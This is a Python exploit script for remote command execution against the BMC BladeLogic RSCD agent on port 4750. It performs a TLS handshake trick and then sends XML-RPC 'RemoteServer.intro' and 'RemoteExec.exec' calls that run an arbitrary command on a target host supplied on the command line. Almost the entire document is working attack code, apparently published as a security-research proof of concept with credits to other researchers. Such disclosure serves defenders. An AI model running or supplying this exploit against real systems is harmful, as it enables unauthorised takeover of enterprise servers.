#!/usr/bin/python

# BMC BladeLogic RSCD agent remote exec - XMLRPC version

# By Paul Taylor / Foregenix Ltd

# Credit: https://github.com/ernw/insinuator-snippets/tree/master/bmc_bladelogic
# Credit: https://github.com/yaolga

# Credit: Nick Bloor for AWS image for testing :-)
# https://github.com/NickstaDB/PoC/tree/master/BMC_RSCD_RCE

import socket
import ssl
import sys
import argparse
import requests
import httplib
from requests.packages.urllib3 import PoolManager
from requests.packages.urllib3.connection import HTTPConnection
from requests.packages.urllib3.connectionpool import HTTPConnectionPool
from requests.adapters import HTTPAdapter


class MyHTTPConnection(HTTPConnection):
    def __init__(self, unix_socket_url, timeout=60):
        HTTPConnection.__init__(self, HOST, timeout=timeout)
        self.unix_socket_url = unix_socket_url
        self.timeout = timeout

    def connect(self):
        self.sock = wrappedSocket


class MyHTTPConnectionPool(HTTPConnectionPool):
    def __init__(self, socket_path, timeout=60):
        HTTPConnectionPool.__init__(self, HOST, timeout=timeout)
        self.socket_path = socket_path
        self.timeout = timeout

    def _new_conn(self):
        return MyHTTPConnection(self.socket_path, self.timeout)


class MyAdapter(HTTPAdapter):
    def __init__(self, timeout=60):
        super(MyAdapter, self).__init__()
        self.timeout = timeout

    def get_connection(self, socket_path, proxies=None):
        return MyHTTPConnectionPool(socket_path, self.timeout)

    def request_url(self, request, proxies):
        return request.path_url


def optParser():
    parser = argparse.ArgumentParser(
                        description="Remote exec " +
                        "BladeLogic Server Automation RSCD agent"
                    )
    parser.add_argument("host", help="IP address of a target system")
    parser.add_argument(
            "-p",
            "--port",
            type=int,
            default=4750,
            help="TCP port (default: 4750)"
            )
    parser.add_argument("command", help="Command to execute")
    opts = parser.parse_args()
    return opts


def sendXMLRPC(host, port, packet, tlsrequest):
    r = tlsrequest.post(
            'http://' + host + ':' + str(port) + '/xmlrpc', data=packet
        )
    print r.status_code
    print r.content
    return


intro = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.intro</methodName><params><param><value>2016-1-14-18-10-30-3920958</value></param><param><value>7</value></param><param><value>0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;</value></param><param><value>8.6.01.66</value></param></params></methodCall>"""
options = optParser()
rexec = options.command
PORT = options.port
HOST = options.host
rexec = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteExec.exec</methodName><params><param><value>""" + rexec  + """</value></param></params></methodCall>"""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

sock.sendall("TLSRPC")
wrappedSocket = ssl.wrap_socket(sock)

adapter = MyAdapter()
s = requests.session()
s.mount("http://", adapter)

sendXMLRPC(HOST, PORT, intro, s)
sendXMLRPC(HOST, PORT, rexec, s)

wrappedSocket.close()
